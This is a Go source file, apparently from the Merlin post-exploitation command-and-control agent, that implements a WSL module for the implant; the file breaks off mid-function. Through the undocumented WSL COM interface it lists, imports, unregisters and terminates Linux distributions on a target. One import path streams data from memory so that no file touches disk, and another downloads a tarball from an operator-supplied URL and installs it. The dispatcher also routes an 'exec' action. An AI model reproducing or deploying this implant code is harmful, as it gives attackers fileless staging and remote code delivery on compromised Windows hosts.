//go:build windows

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/Ne0nd0g/merlin-message/jobs"

	"github.com/Ne0nd0g/merlin-agent/v2/cli"
)

// COM GUIDs for WSL service
var (
	clsidLxssUserSession = windows.GUID{
		Data1: 0xA9B7A1B9,
		Data2: 0x0671,
		Data3: 0x405C,
		Data4: [8]byte{0x95, 0xF1, 0xE0, 0x61, 0x2C, 0xB4, 0xCE, 0x7E},
	}
	iidILxssUserSession = windows.GUID{
		Data1: 0x38541BDC,
		Data2: 0xF54F,
		Data3: 0x4CEB,
		Data4: [8]byte{0x85, 0xD0, 0x37, 0xF0, 0xF3, 0xD2, 0x61, 0x7E},
	}
)

// Lazy-loaded DLL procs
var (
	modOle32              = windows.NewLazySystemDLL("ole32.dll")
	procCoInitializeEx    = modOle32.NewProc("CoInitializeEx")
	procCoInitializeSec   = modOle32.NewProc("CoInitializeSecurity")
	procCoCreateInstance  = modOle32.NewProc("CoCreateInstance")
	procCoUninitialize    = modOle32.NewProc("CoUninitialize")
	procCoTaskMemFree     = modOle32.NewProc("CoTaskMemFree")

	modWs2_32        = windows.NewLazySystemDLL("ws2_32.dll")
	procWSAStartup   = modWs2_32.NewProc("WSAStartup")
	procWSACleanup   = modWs2_32.NewProc("WSACleanup")
	procRecv         = modWs2_32.NewProc("recv")
	procIoctlSocket  = modWs2_32.NewProc("ioctlsocket")
	procClosesocket  = modWs2_32.NewProc("closesocket")
)

// COM constants
const (
	coinitMultithreaded  = 0x0
	clsctxLocalServer    = 0x4
	eoacStaticCloaking   = 0x20

	rpcCAuthnLevelDefault    = 0
	rpcCImpLevelImpersonate  = 3
	rpcETooLate              = 0x80010119
)

// Winsock constants
const (
	fionbio    = 0x8004667e
	bufferSize = 4096
)

// LXSS types matching the COM interface definitions
type lxssErrorInfo struct {
	Member0  int32
	Member8  int32
	Member10 uintptr // wchar_t*
	Member18 uintptr // wchar_t*
}

type lxssHandle struct {
	Member0 uint32
	Member4 uint32 // LxssHandleType
}

type lxssStdHandles struct {
	Stdin  lxssHandle
	Stdout lxssHandle
	Stderr lxssHandle
}

// WSADATA for WSAStartup
type wsaData struct {
	Version      uint16
	HighVersion  uint16
	MaxSockets   uint16
	MaxUdpDg     uint16
	VendorInfo   *byte
	Description  [257]byte
	SystemStatus [129]byte
}

// wslVersion holds the parsed WSL version
type wslVersion struct {
	Major    uint32
	Minor    uint32
	Build    uint32
	Revision uint32
}

// wslInterfaceVersion identifies which COM interface variant to use
type wslInterfaceVersion int

const (
	wslIF_2_0_0_0  wslInterfaceVersion = iota // v2.0.0.0 - v2.2.4.0
	wslIF_2_3_11_0                             // v2.3.11.0 - v2.3.17.0
	wslIF_2_3_21_0                             // v2.3.21.0 - v2.3.26.0
	wslIF_2_4_4_0                              // v2.4.4.0 - v2.4.13.0
	wslIF_2_5_1_0                              // v2.5.1.0
	wslIF_2_5_4_0                              // v2.5.4.0
	wslIF_2_5_6_0                              // v2.5.6.0 - v2.5.10.0
	wslIF_2_6_0_0                              // v2.6.0.0 - v2.7.0.0+
	wslIF_Unknown
)

// vtable method indices — IUnknown: 0=QueryInterface, 1=AddRef, 2=Release
// ILxssUserSession methods start at index 3
const (
	vtableRelease            = 2
	vtableRegisterDist       = 4 // RegisterDistribution (file handle)
	vtableRegisterDistPipe   = 5 // RegisterDistributionPipe (pipe handle)
	vtableGetDistributionId  = 6
	vtableTerminateDist      = 7
	vtableUnregisterDist     = 8
)

// createLxProcessIndex returns the vtable index for CreateLxProcess based on interface version
func createLxProcessIndex(ifVer wslInterfaceVersion) uintptr {
	// v2.0.0.0-2.4.13.0: CreateLxProcess at index 15
	// v2.5.1.0+: extra Proc15 inserted, CreateLxProcess shifts to index 16
	if ifVer <= wslIF_2_4_4_0 {
		return 15
	}
	return 16
}

// hasInteropSocket returns true if this version's CreateLxProcess includes the InteropSocket parameter
func hasInteropSocket(ifVer wslInterfaceVersion) bool {
	return ifVer != wslIF_2_0_0_0
}

// ---------------------------------------------------------------------------
// COM session helper
// ---------------------------------------------------------------------------

// comSession holds a COM session to the WSL service
type comSession struct {
	session uintptr
	ifVer   wslInterfaceVersion
	ver     wslVersion
}

// newCOMSession initializes COM and creates an ILxssUserSession.
// The caller must invoke the returned cleanup function when done.
func newCOMSession() (*comSession, func(), error) {
	runtime.LockOSThread()

	ver, err := getWSLVersion()
	if err != nil {
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to get WSL version: %w", err)
	}

	ifVer := determineInterfaceVersion(ver)
	if ifVer == wslIF_Unknown {
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("unsupported WSL version: %d.%d.%d.%d", ver.Major, ver.Minor, ver.Build, ver.Revision)
	}

	cli.Message(cli.NOTE, fmt.Sprintf("WSL version: %d.%d.%d.%d (interface variant: %d)",
		ver.Major, ver.Minor, ver.Build, ver.Revision, ifVer))

	hr, _, _ := procCoInitializeEx.Call(0, coinitMultithreaded)
	if int32(hr) < 0 {
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("CoInitializeEx failed: 0x%08X", uint32(hr))
	}

	hr, _, _ = procCoInitializeSec.Call(
		0,                           // pSecDesc
		uintptr(0xFFFFFFFFFFFFFFFF), // cAuthSvc = -1
		0,                           // asAuthSvc
		0,                           // pReserved1
		rpcCAuthnLevelDefault,       // dwAuthnLevel
		rpcCImpLevelImpersonate,     // dwImpLevel
		0,                           // pAuthList
		eoacStaticCloaking,          // dwCapabilities
		0,                           // pReserved3
	)
	if int32(hr) < 0 && uint32(hr) != rpcETooLate {
		cli.Message(cli.WARN, fmt.Sprintf("CoInitializeSecurity failed: 0x%08X (non-fatal)", uint32(hr)))
	}

	var session uintptr
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidLxssUserSession)),
		0,
		clsctxLocalServer,
		uintptr(unsafe.Pointer(&iidILxssUserSession)),
		uintptr(unsafe.Pointer(&session)),
	)
	if int32(hr) < 0 || session == 0 {
		procCoUninitialize.Call()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("CoCreateInstance failed: 0x%08X\nMake sure WSL is installed and the WslService is running", uint32(hr))
	}

	cli.Message(cli.NOTE, "WSL COM session created successfully")

	cleanup := func() {
		comRelease(session)
		procCoUninitialize.Call()
		runtime.UnlockOSThread()
	}

	return &comSession{session: session, ifVer: ifVer, ver: ver}, cleanup, nil
}

// resolveDistroGUID looks up a distribution's GUID by name via GetDistributionId (vtable 6)
func resolveDistroGUID(session uintptr, distro string) (windows.GUID, error) {
	distroWide, err := syscall.UTF16PtrFromString(distro)
	if err != nil {
		return windows.GUID{}, fmt.Errorf("failed to convert distro name: %w", err)
	}

	var errorInfo lxssErrorInfo
	var guid windows.GUID

	_, err = comVtableCall(session, vtableGetDistributionId,
		uintptr(unsafe.Pointer(distroWide)),
		0, // Flags
		uintptr(unsafe.Pointer(&errorInfo)),
		uintptr(unsafe.Pointer(&guid)),
	)
	if err != nil {
		errMsg := fmt.Sprintf("GetDistributionId failed for '%s': %s", distro, err)
		if errorInfo.Member10 != 0 {
			errStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(errorInfo.Member10)))
			errMsg += fmt.Sprintf("\nError detail: %s", errStr)
		}
		freeErrorInfo(&errorInfo)
		return windows.GUID{}, fmt.Errorf("%s", errMsg)
	}
	freeErrorInfo(&errorInfo)

	cli.Message(cli.NOTE, fmt.Sprintf("Resolved distro '%s' -> GUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		distro, guid.Data1, guid.Data2, guid.Data3,
		guid.Data4[0], guid.Data4[1], guid.Data4[2],
		guid.Data4[3], guid.Data4[4], guid.Data4[5],
		guid.Data4[6], guid.Data4[7]))

	return guid, nil
}

// ---------------------------------------------------------------------------
// Version-aware RegisterDistribution / RegisterDistributionPipe arg builder
// ---------------------------------------------------------------------------

// buildRegisterArgs constructs the version-aware parameter list for RegisterDistribution
// (Proc4) or RegisterDistributionPipe (Proc5). The handle is a file HANDLE or pipe read HANDLE.
//
// Parameter layout per version:
//
//	v2.0-2.2  (8):  Name, Version, Handle, TargetDir, Flags, PkgFamily, Error, Guid
//	v2.3      (9):  Name, Version, Handle, Stderr, TargetDir, Flags, PkgFamily, Error, Guid
//	v2.4-2.5.1(10): Name, Version, Handle, Stderr, TargetDir, Flags, PkgFamily, InstalledName, Error, Guid
//	v2.5.4+   (11): Name, Version, Handle, Stderr, TargetDir, Flags, VhdSize, PkgFamily, InstalledName, Error, Guid
func buildRegisterArgs(
	ifVer wslInterfaceVersion,
	namePtr, handle, stderrPipe, targetDir uintptr,
	installedName *uintptr,
	errorInfo *lxssErrorInfo,
	guid *windows.GUID,
) []uintptr {
	switch {
	case ifVer <= wslIF_2_0_0_0:
		return []uintptr{
			namePtr,
			2,      // WSL version 2
			handle,
			targetDir,
			0, // Flags
			0, // PackageFamilyName (NULL)
			uintptr(unsafe.Pointer(errorInfo)),
			uintptr(unsafe.Pointer(guid)),
		}

	case ifVer <= wslIF_2_3_21_0:
		return []uintptr{
			namePtr,
			2,
			handle,
			stderrPipe,
			targetDir,
			0,
			0,
			uintptr(unsafe.Pointer(errorInfo)),
			uintptr(unsafe.Pointer(guid)),
		}

	case ifVer <= wslIF_2_5_1_0:
		return []uintptr{
			namePtr,
			2,
			handle,
			stderrPipe,
			targetDir,
			0,
			0,
			uintptr(unsafe.Pointer(installedName)),
			uintptr(unsafe.Pointer(errorInfo)),
			uintptr(unsafe.Pointer(guid)),
		}

	default:
		// v2.5.4+: +VhdSize (ULONG64, single uintptr on x64)
		return []uintptr{
			namePtr,
			2,
			handle,
			stderrPipe,
			targetDir,
			0, // Flags
			0, // VhdSize (0 = default)
			0, // PackageFamilyName (NULL)
			uintptr(unsafe.Pointer(installedName)),
			uintptr(unsafe.Pointer(errorInfo)),
			uintptr(unsafe.Pointer(guid)),
		}
	}
}

// ---------------------------------------------------------------------------
// Import / Unregister / Terminate implementations
// ---------------------------------------------------------------------------

// importDistributionPipe imports a WSL distribution by streaming tarball data through
// an anonymous pipe to RegisterDistributionPipe (Proc5). No file touches disk.
func importDistributionPipe(name string, data []byte, targetDir string) (stdout, stderr string) {
	cs, cleanup, err := newCOMSession()
	if err != nil {
		stderr = err.Error()
		return
	}
	defer cleanup()

	nameWide, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		stderr = fmt.Sprintf("failed to convert distro name: %s", err)
		return
	}

	var targetDirPtr uintptr
	if targetDir != "" {
		td, err := syscall.UTF16PtrFromString(targetDir)
		if err != nil {
			stderr = fmt.Sprintf("failed to convert target directory: %s", err)
			return
		}
		targetDirPtr = uintptr(unsafe.Pointer(td))
	}

	// Create anonymous pipe for streaming the tarball to the WSL service
	var readPipe, writePipe windows.Handle
	sa := &windows.SecurityAttributes{InheritHandle: 1}
	if err := windows.CreatePipe(&readPipe, &writePipe, sa, 0); err != nil {
		stderr = fmt.Sprintf("CreatePipe failed: %s", err)
		return
	}

	// Write tarball data to the pipe in a background goroutine.
	// The COM call reads from the read end; backpressure is handled by the pipe buffer.
	errCh := make(chan error, 1)
	go func() {
		defer windows.CloseHandle(writePipe)
		offset := 0
		for offset < len(data) {
			var written uint32
			chunk := data[offset:]
			if len(chunk) > 65536 {
				chunk = chunk[:65536]
			}
			if err := windows.WriteFile(writePipe, chunk, &written, nil); err != nil {
				errCh <- fmt.Errorf("pipe write failed at offset %d: %w", offset, err)
				return
			}
			offset += int(written)
		}
		errCh <- nil
	}()

	var errorInfo lxssErrorInfo
	var distroGUID windows.GUID
	var installedName uintptr

	cli.Message(cli.NOTE, fmt.Sprintf("Importing distribution '%s' via pipe (%d bytes)...", name, len(data)))

	args := buildRegisterArgs(cs.ifVer,
		uintptr(unsafe.Pointer(nameWide)),
		uintptr(readPipe),
		0, // stderrPipe — not used for simplicity
		targetDirPtr,
		&installedName,
		&errorInfo,
		&distroGUID,
	)

	_, comErr := comVtableCall(cs.session, vtableRegisterDistPipe, args...)

	// Close the read end now that the COM call completed
	windows.CloseHandle(readPipe)

	// Wait for the writer goroutine to finish
	writeErr := <-errCh

	if installedName != 0 {
		procCoTaskMemFree.Call(installedName)
	}

	if comErr != nil {
		errMsg := fmt.Sprintf("RegisterDistributionPipe failed: %s", comErr)
		if errorInfo.Member10 != 0 {
			errStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(errorInfo.Member10)))
			errMsg += fmt.Sprintf("\nError detail: %s", errStr)
		}
		freeErrorInfo(&errorInfo)
		if writeErr != nil {
			errMsg += fmt.Sprintf("\nPipe writer: %s", writeErr)
		}
		stderr = errMsg
		return
	}
	freeErrorInfo(&errorInfo)

	if writeErr != nil {
		stderr = fmt.Sprintf("pipe writer failed: %s", writeErr)
		return
	}

	stdout = fmt.Sprintf("Successfully imported distribution '%s'\nGUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		name,
		distroGUID.Data1, distroGUID.Data2, distroGUID.Data3,
		distroGUID.Data4[0], distroGUID.Data4[1], distroGUID.Data4[2],
		distroGUID.Data4[3], distroGUID.Data4[4], distroGUID.Data4[5],
		distroGUID.Data4[6], distroGUID.Data4[7])
	return
}

// importDistributionURL imports a WSL distribution by streaming a tarball from an HTTP(S)
// URL through an anonymous pipe to RegisterDistributionPipe (Proc5). No file touches disk.
func importDistributionURL(name, url, targetDir string) (stdout, stderr string) {
	cs, cleanup, err := newCOMSession()
	if err != nil {
		stderr = err.Error()
		return
	}
	defer cleanup()

	nameWide, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		stderr = fmt.Sprintf("failed to convert distro name: %s", err)
		return
	}

	var targetDirPtr uintptr
	if targetDir != "" {
		td, err := syscall.UTF16PtrFromString(targetDir)
		if err != nil {
			stderr = fmt.Sprintf("failed to convert target directory: %s", err)
			return
		}
		targetDirPtr = uintptr(unsafe.Pointer(td))
	}

	// Create anonymous pipe for streaming the tarball to the WSL service
	var readPipe, writePipe windows.Handle
	sa := &windows.SecurityAttributes{InheritHandle: 1}
	if err := windows.CreatePipe(&readPipe, &writePipe, sa, 0); err != nil {
		stderr = fmt.Sprintf("CreatePipe failed: %s", err)
		return
	}

	// Fetch URL and stream response body to pipe write end in a background goroutine
	errCh := make(chan error, 1)
	go func() {
		defer windows.CloseHandle(writePipe)
		httpClient := &http.Client{Timeout: 30 * time.Minute}
		resp, err := httpClient.Get(url)
		if err != nil {
			errCh <- fmt.Errorf("HTTP GET failed: %w", err)
			return
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			errCh <- fmt.Errorf("HTTP GET returned status %d", resp.StatusCode)
			return
		}
		// Stream response body to pipe using a buffer
		buf := make([]byte, 65536)
		for {
			n, readErr := resp.Body.Read(buf)
			if n > 0 {
				offset := 0
				for offset < n {
					var written uint32
					chunk := buf[offset:n]
					if writeErr := windows.WriteFile(writePipe, chunk, &written, nil); writeErr != nil {
						errCh <- fmt.Errorf("pipe write failed: %w", writeErr)
						return
					}
					offset += int(written)
				}
			}
			if readErr == io.EOF {
				break
			}
			if readErr != nil {
				errCh <- fmt.Errorf("HTTP body read failed: %w", readErr)
				return
			}
		}
		errCh <- nil
	}()

	var errorInfo lxssErrorInfo
	var distroGUID windows.GUID
	var installedName uintptr

	cli.Message(cli.NOTE, fmt.Sprintf("Importing distribution '%s' from URL '%s' via pipe...", name, url))

	args := buildRegisterArgs(cs.ifVer,
		uintptr(unsafe.Pointer(nameWide)),
		uintptr(readPipe),
		0, // stderrPipe — not used for simplicity
		targetDirPtr,
		&installedName,
		&errorInfo,
		&distroGUID,
	)

	_, comErr := comVtableCall(cs.session, vtableRegisterDistPipe, args...)

	// Close the read end now that the COM call completed
	windows.CloseHandle(readPipe)

	// Wait for the writer goroutine to finish
	writeErr := <-errCh

	if installedName != 0 {
		procCoTaskMemFree.Call(installedName)
	}

	if comErr != nil {
		errMsg := fmt.Sprintf("RegisterDistributionPipe failed: %s", comErr)
		if errorInfo.Member10 != 0 {
			errStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(errorInfo.Member10)))
			errMsg += fmt.Sprintf("\nError detail: %s", errStr)
		}
		freeErrorInfo(&errorInfo)
		if writeErr != nil {
			errMsg += fmt.Sprintf("\nURL streamer: %s", writeErr)
		}
		stderr = errMsg
		return
	}
	freeErrorInfo(&errorInfo)

	if writeErr != nil {
		stderr = fmt.Sprintf("URL streamer failed: %s", writeErr)
		return
	}

	stdout = fmt.Sprintf("Successfully imported distribution '%s' from URL\nGUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		name,
		distroGUID.Data1, distroGUID.Data2, distroGUID.Data3,
		distroGUID.Data4[0], distroGUID.Data4[1], distroGUID.Data4[2],
		distroGUID.Data4[3], distroGUID.Data4[4], distroGUID.Data4[5],
		distroGUID.Data4[6], distroGUID.Data4[7])
	return
}

// importDistributionFile imports a WSL distribution from a tarball file already present
// on the target via RegisterDistribution (Proc4).
func importDistributionFile(name, filePath, targetDir string) (stdout, stderr string) {
	cs, cleanup, err := newCOMSession()
	if err != nil {
		stderr = err.Error()
		return
	}
	defer cleanup()

	nameWide, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		stderr = fmt.Sprintf("failed to convert distro name: %s", err)
		return
	}

	var targetDirPtr uintptr
	if targetDir != "" {
		td, err := syscall.UTF16PtrFromString(targetDir)
		if err != nil {
			stderr = fmt.Sprintf("failed to convert target directory: %s", err)
			return
		}
		targetDirPtr = uintptr(unsafe.Pointer(td))
	}

	// Open the tarball file for reading
	pathWide, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		stderr = fmt.Sprintf("failed to convert file path: %s", err)
		return
	}
	fileHandle, err := windows.CreateFile(
		pathWide,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		stderr = fmt.Sprintf("failed to open file '%s': %s", filePath, err)
		return
	}
	defer windows.CloseHandle(fileHandle)

	var errorInfo lxssErrorInfo
	var distroGUID windows.GUID
	var installedName uintptr

	cli.Message(cli.NOTE, fmt.Sprintf("Importing distribution '%s' from file '%s'...", name, filePath))

	args := buildRegisterArgs(cs.ifVer,
		uintptr(unsafe.Pointer(nameWide)),
		uintptr(fileHandle),
		0, // stderrPipe
		targetDirPtr,
		&installedName,
		&errorInfo,
		&distroGUID,
	)

	_, comErr := comVtableCall(cs.session, vtableRegisterDist, args...)

	if installedName != 0 {
		procCoTaskMemFree.Call(installedName)
	}

	if comErr != nil {
		errMsg := fmt.Sprintf("RegisterDistribution failed: %s", comErr)
		if errorInfo.Member10 != 0 {
			errStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(errorInfo.Member10)))
			errMsg += fmt.Sprintf("\nError detail: %s", errStr)
		}
		freeErrorInfo(&errorInfo)
		stderr = errMsg
		return
	}
	freeErrorInfo(&errorInfo)

	stdout = fmt.Sprintf("Successfully imported distribution '%s' from '%s'\nGUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		name, filePath,
		distroGUID.Data1, distroGUID.Data2, distroGUID.Data3,
		distroGUID.Data4[0], distroGUID.Data4[1], distroGUID.Data4[2],
		distroGUID.Data4[3], distroGUID.Data4[4], distroGUID.Data4[5],
		distroGUID.Data4[6], distroGUID.Data4[7])
	return
}

// unregisterDistribution completely removes a WSL distribution via UnregisterDistribution (Proc8).
func unregisterDistribution(name string) (stdout, stderr string) {
	cs, cleanup, err := newCOMSession()
	if err != nil {
		stderr = err.Error()
		return
	}
	defer cleanup()

	guid, err := resolveDistroGUID(cs.session, name)
	if err != nil {
		stderr = err.Error()
		return
	}

	var errorInfo lxssErrorInfo
	_, err = comVtableCall(cs.session, vtableUnregisterDist,
		uintptr(unsafe.Pointer(&guid)),
		uintptr(unsafe.Pointer(&errorInfo)),
	)
	if err != nil {
		errMsg := fmt.Sprintf("UnregisterDistribution failed: %s", err)
		if errorInfo.Member10 != 0 {
			errStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(errorInfo.Member10)))
			errMsg += fmt.Sprintf("\nError detail: %s", errStr)
		}
		freeErrorInfo(&errorInfo)
		stderr = errMsg
		return
	}
	freeErrorInfo(&errorInfo)

	stdout = fmt.Sprintf("Successfully unregistered distribution '%s'", name)
	return
}

// terminateDistribution stops a running WSL distribution via TerminateDistribution (Proc7).
func terminateDistribution(name string) (stdout, stderr string) {
	cs, cleanup, err := newCOMSession()
	if err != nil {
		stderr = err.Error()
		return
	}
	defer cleanup()

	guid, err := resolveDistroGUID(cs.session, name)
	if err != nil {
		stderr = err.Error()
		return
	}

	var errorInfo lxssErrorInfo
	_, err = comVtableCall(cs.session, vtableTerminateDist,
		uintptr(unsafe.Pointer(&guid)),
		uintptr(unsafe.Pointer(&errorInfo)),
	)
	if err != nil {
		errMsg := fmt.Sprintf("TerminateDistribution failed: %s", err)
		if errorInfo.Member10 != 0 {
			errStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(errorInfo.Member10)))
			errMsg += fmt.Sprintf("\nError detail: %s", errStr)
		}
		freeErrorInfo(&errorInfo)
		stderr = errMsg
		return
	}
	freeErrorInfo(&errorInfo)

	stdout = fmt.Sprintf("Successfully terminated distribution '%s'", name)
	return
}

// ---------------------------------------------------------------------------
// Command dispatcher
// ---------------------------------------------------------------------------

// WSLImportPipe imports a WSL distribution from raw tarball bytes piped to COM.
// This is the direct-call path used by the job service to avoid base64 encode/decode overhead.
func WSLImportPipe(name string, data []byte, targetDir string) jobs.Results {
	var results jobs.Results
	results.Stdout, results.Stderr = importDistributionPipe(name, data, targetDir)
	if results.Stderr != "" {
		cli.Message(cli.WARN, results.Stderr)
	} else if results.Stdout != "" {
		cli.Message(cli.SUCCESS, results.Stdout)
	}
	return results
}

// WSLCommand dispatches WSL commands
func WSLCommand(cmd jobs.Command) jobs.Results {
	cli.Message(cli.NOTE, fmt.Sprintf("Executing WSL command: %s", cmd.Command))

	var results jobs.Results
	if len(cmd.Args) < 1 {
		results.Stderr = "wsl command requires at least one argument"
		return results
	}

	action := strings.ToLower(cmd.Args[0])
	switch action {
	case "list":
		results.Stdout, results.Stderr = listDistributions()
	case "exec":
		if len(cmd.Args) < 3 {
			results.Stderr = "wsl exec requires a distribution name and command"
			return results
		}
		results.Stdout, results.Stderr = execInWSL(cmd.Args[1], cmd.Args[2])
	case "import":
		if len(cmd.Args) < 3 {
			results.Stderr = "wsl import requires a distribution name and base64-encoded tarball data"
			return results
		}
		data, err := base64.StdEncoding.DecodeString(cmd.Args[2])
		if err != nil {
			results.Stderr = fmt.Sprintf("failed to decode tarball data: %s", err)
			return results
		}
		var targetDir string
		if len(cmd.Args) > 3 {
			targetDir = cmd.Args[3]
		}
		results.Stdout, results.Stderr = importDistributionPipe(cmd.Args[1], data, targetDir)
	case "import-url":
		if len(cmd.Args) < 3 {
			results.Stderr = "wsl import-url requires a distribution name and URL"
			return results
		}
		var targetDir string
		if len(cmd.Args) > 3 {
			targetDir = cmd.Args[3]
		}
		results.Stdout, results.Stderr = importDistributionURL(cmd.Args[1], cmd.Args[2], targetDir)
	case "import-local":
		if len(cmd.Args) < 3 {
			results.Stderr = "wsl import-local requires a distribution name and file path"
			return results
		}
		var targetDir string
		if len(cmd.Args) > 3 {
			targetDir = cmd.Args[3]
		}
		results.Stdout, results.Stderr = importDistributionFile(cmd.Args[1], cmd.Args[2], targetDir)
	case "unregister":
		if len(cmd.Args) < 2 {
			results.Stderr = "wsl unregister requires a distribution name"
			return results
		}
		results.Stdout, results.Stderr = unregisterDistribution(cmd.Args[1])
	case "terminate":
		if len(cmd.Args) < 2 {
			results.Stderr = "wsl terminate requires a distribution name"
			return results
		}
		results.Stdout, results.Stderr = terminateDistribution(cmd.Args[1])
	default:
		results.Stderr = fmt.Sprintf("unknown wsl action: %s", action)
	}

	if results.Stderr != "" {
		cli.Message(cli.WARN, results.Stderr)
	} else if results.Stdout != "" {
		cli.Message(cli.SUCCESS, results.Stdout)
	}
	return results
}

// ---------------------------------------------------------------------------
// Registry-based distribution listing
// ---------------------------------------------------------------------------

// listDistributions enumerates installed WSL distributions from the registry
func listDistributions() (stdout, stderr string) {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Lxss`,
		registry.READ)
	if err != nil {
		stderr = fmt.Sprintf("failed to open WSL registry key: %s\nIs WSL installed?", err)
		return
	}
	defer k.Close()

	// Get default distribution GUID
	defaultGUID, _, _ := k.GetStringValue("DefaultDistribution")

	subkeys, err := k.ReadSubKeyNames(-1)
	if err != nil {
		stderr = fmt.Sprintf("failed to enumerate WSL distributions: %s", err)
		return
	}

	var sb strings.Builder
	sb.WriteString("Windows Subsystem for Linux Distributions:\n")
	found := false

	for _, subkey := range subkeys {
		dk, err := registry.OpenKey(registry.CURRENT_USER,
			`Software\Microsoft\Windows\CurrentVersion\Lxss\`+subkey,
			registry.READ)
		if err != nil {
			continue
		}

		distroName, _, err := dk.GetStringValue("DistributionName")
		if err != nil || distroName == "" {
			dk.Close()
			continue
		}

		version, _, _ := dk.GetIntegerValue("Version")
		dk.Close()

		isDefault := strings.EqualFold(subkey, defaultGUID)
		if isDefault {
			sb.WriteString(fmt.Sprintf("  %s (Default) (WSL%d)\n", distroName, version))
		} else {
			sb.WriteString(fmt.Sprintf("  %s (WSL%d)\n", distroName, version))
		}
		found = true
	}

	if !found {
		sb.WriteString("No distributions found.\n")
		sb.WriteString("Use 'wsl.exe --install' or install from the Microsoft Store.\n")
	}

	stdout = sb.String()
	return
}

// ---------------------------------------------------------------------------
// WSL version detection and interface mapping
// ---------------------------------------------------------------------------

// getWSLVersion reads the installed WSL version from the registry
func getWSLVersion() (wslVersion, error) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI`,
		registry.READ|registry.WOW64_64KEY)
	if err != nil {
		return wslVersion{}, fmt.Errorf("failed to open WSL MSI registry key: %w", err)
	}
	defer k.Close()

	versionStr, _, err := k.GetStringValue("Version")
	if err != nil {
		return wslVersion{}, fmt.Errorf("failed to read WSL version: %w", err)
	}

	var v wslVersion
	n, _ := fmt.Sscanf(versionStr, "%d.%d.%d.%d", &v.Major, &v.Minor, &v.Build, &v.Revision)
	if n != 4 {
		return wslVersion{}, fmt.Errorf("failed to parse WSL version string: %s", versionStr)
	}

	return v, nil
}

// compareVersion compares a wslVersion against specific version numbers
func compareVersion(v wslVersion, maj, min, bld, rev uint32) int {
	if v.Major != maj {
		return int(v.Major) - int(maj)
	}
	if v.Minor != min {
		return int(v.Minor) - int(min)
	}
	if v.Build != bld {
		return int(v.Build) - int(bld)
	}
	return int(v.Revision) - int(rev)
}

// determineInterfaceVersion maps a WSL version to the appropriate COM interface variant
func determineInterfaceVersion(v wslVersion) wslInterfaceVersion {
	if compareVersion(v, 2, 0, 0, 0) >= 0 && compareVersion(v, 2, 2, 4, 0) <= 0 {
		return wslIF_2_0_0_0
	}
	if compareVersion(v, 2, 3, 11, 0) >= 0 && compareVersion(v, 2, 3, 17, 0) <= 0 {
		return wslIF_2_3_11_0
	}
	if compareVersion(v, 2, 3, 21, 0) >= 0 && compareVersion(v, 2, 3, 26, 0) <= 0 {
		return wslIF_2_3_21_0
	}
	if compareVersion(v, 2, 4, 4, 0) >= 0 && compareVersion(v, 2, 4, 13, 0) <= 0 {
		return wslIF_2_4_4_0
	}
	if v.Major == 2 && v.Minor == 5 && v.Build == 1 {
		return wslIF_2_5_1_0
	}
	if v.Major == 2 && v.Minor == 5 && v.Build == 4 {
		return wslIF_2_5_4_0
	}
	if compareVersion(v, 2, 5, 6, 0) >= 0 && compareVersion(v, 2, 5, 10, 0) <= 0 {
		return wslIF_2_5_6_0
	}
	if compareVersion(v, 2, 6, 0, 0) >= 0 {
		return wslIF_2_6_0_0
	}
	return wslIF_Unknown
}

// ---------------------------------------------------------------------------
// COM helpers
// ---------------------------------------------------------------------------

// comVtableCall calls a COM interface method by vtable index using SyscallN
func comVtableCall(iface uintptr, methodIndex uintptr, args ...uintptr) (uintptr, error) {
	vtable := *(*uintptr)(unsafe.Pointer(iface))
	method := *(*uintptr)(unsafe.Pointer(vtable + methodIndex*unsafe.Sizeof(uintptr(0))))
	allArgs := make([]uintptr, 0, 1+len(args))
	allArgs = append(allArgs, iface) // this pointer
	allArgs = append(allArgs, args...)
	r1, _, _ := syscall.SyscallN(method, allArgs...)
	// Treat r1 as HRESULT; do not use err from SyscallN for COM status
	hr := int32(r1)
	if hr < 0 {
		return r1, fmt.Errorf("COM call failed with HRESULT: 0x%08X", uint32(hr))
	}
	return r1, nil
}

// comRelease calls IUnknown::Release on a COM interface pointer
func comRelease(iface uintptr) {
	if iface != 0 {
		comVtableCall(iface, vtableRelease)
	}
}

// freeErrorInfo releases LXSS_ERROR_INFO string members
func freeErrorInfo(ei *lxssErrorInfo) {
